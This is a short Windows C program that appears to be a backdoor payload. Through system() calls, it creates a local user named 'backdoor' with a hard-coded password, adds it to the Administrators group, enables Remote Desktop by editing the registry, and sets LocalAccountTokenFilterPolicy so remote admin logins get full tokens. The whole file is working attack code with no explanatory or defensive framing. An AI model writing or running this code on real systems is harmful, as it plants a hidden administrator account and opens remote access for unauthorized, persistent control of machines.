#include <windows.h>
#include <stdio.h>
#include <stdlib.h>



int main(int argc, char *argv[]) 
{
	printf("Creating user new user\n");		
    system("net.exe user backdoor Password123! /add");
    
    printf("Adding user to Administrators group\n");		
    system("net.exe localgroup Administrators backdoor /add");
    
    printf("Enabling RDP\n");		
    system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    
    printf("Allowing Admins access by setting LocalAccountTokenFilterPolicy to 1\n");		
    system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1");

	return 0;
}
